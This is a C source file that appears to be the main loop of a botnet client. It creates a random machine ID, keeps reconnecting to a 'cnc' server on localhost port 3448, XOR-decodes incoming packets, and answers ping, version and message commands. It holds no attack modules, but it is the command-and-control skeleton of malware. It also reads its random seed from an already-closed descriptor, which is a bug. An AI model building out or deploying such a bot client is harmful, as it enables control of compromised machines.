#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/time.h>
#include <netinet/in.h>

#include "xhdrs/includes.h"
#include "xhdrs/net.h"
#include "xhdrs/packet.h"
#include "xhdrs/sha256.h"
#include "xhdrs/utils.h"

time_t proc_startup;
sig_atomic_t exiting = 0;

uint32_t table_key = 0xdeadbeef; // util_strxor; For packets only?

static volatile int sockfd = -1;
static char uniq_id[32] = "";

#ifdef DEBUG
static void init_exit(void)
{	
	util_msgc("Info", "Process ran for %ld second(s).", 
		(time(NULL) - proc_startup));
	util_msgc("Info", "Exiting: now");
}

static void sigexit(int signo)
{
    exiting = 1;
	init_exit();
}

static void init_signals(void)
{
    struct sigaction sa;
    sigset_t ss;
	
    sigemptyset(&ss);
	
    sa.sa_handler = sigexit;
    sa.sa_mask = ss;
    sa.sa_flags = 0;
    sigaction(SIGINT, &sa, 0);
	
	util_msgc("Info", "Initiated Signals!");
}
#endif

static void init_uniq_id(void)
{
	int fd, rc, offset;
	char tmp_uniqid[21], final_uniqid[41];
	
	fd = open("/dev/urandom", O_RDONLY);
	if(fd < 0)
	{
#ifdef DEBUG
		util_msgc("Error", "open(urandom)");
#endif
		_exit(EXIT_FAILURE);
	}
	
	rc = read(fd, tmp_uniqid, 20);
	if(rc < 0)
	{
#ifdef DEBUG
		util_msgc("Error", "read(urandom)");
#endif
		_exit(EXIT_FAILURE);
	}
		
	close(fd);
	
	for(offset = 0; offset < 20; offset++)
	{
		sprintf((final_uniqid + (2 * offset)), 
			"%02x", tmp_uniqid[offset] & 0xff);
	}
	
	sprintf(uniq_id, "%s", final_uniqid);
#ifdef DEBUG
	util_msgc("Info", "Your Machine ID is %s", uniq_id);
#endif
	
    {
        unsigned seed;
        read(fd, &seed, sizeof(seed));
        srandom(seed);
    }
}

int main(int argc, char *argv[])
{
	proc_startup = time(NULL);
#ifdef DEBUG
	init_signals();
#endif
	init_uniq_id();

	while(!exiting)
	{	
		while((sockfd = net_connect("localhost", "3448", IPPROTO_TCP)) <= 0)
		{
			if(exiting)
				break;
#ifdef DEBUG
			util_msgc("Info", "Unable to connect, retrying...");
#endif
			util_sleep(1);
		}
		
		while(!exiting)
		{
			ssize_t buflen;
			char pktbuf[512];
			
			struct Packet pkt;
			
			memset(pktbuf, 0, sizeof(pktbuf));
			
			if(read(sockfd, pktbuf, 1) == 0)
			{
				close(sockfd);
				break;
			}
			
			memset(pktbuf, 0, sizeof(pktbuf));
			
			while(memset(pktbuf, 0, sizeof(pktbuf)) && 
				(buflen = recv(sockfd, pktbuf, sizeof(pktbuf), 0)))
			{
				if(exiting)
					break;
				
				if(buflen != sizeof(struct Packet))
					continue;
				
				memcpy(&pkt, pktbuf, buflen);
				
				util_strxor(pkt.msg.payload, pkt.msg.payload, pkt.msg.length);
				
#ifdef DEBUG
				// Packet received
				util_msgc("Info", "We've received a %s!", util_type2str(pkt.type));
#endif
				switch(pkt.type)
				{
					case PING:
#ifdef DEBUG
						util_msgc("Info", "Ping from cnc!");
#endif
						net_fdsend(sockfd, PONG, "");
					break;
					
					case VERSION:
#ifdef DEBUG
						util_msgc("Info", "Version from cnc!");
#endif
						net_fdsend(sockfd, VERSION, VERSIONSTR);
					break;
					
					case MESSAGE:
#ifdef DEBUG
						util_msgc("Info", "Message from cnc!");
						util_msgc("Message", "Payload: %s", pkt.msg.payload);
#endif
					break;
				} // Switch
			} // While
			sleep(1);
		} // While
	} // While
	
	close(sockfd);
	
	return EXIT_SUCCESS;
}
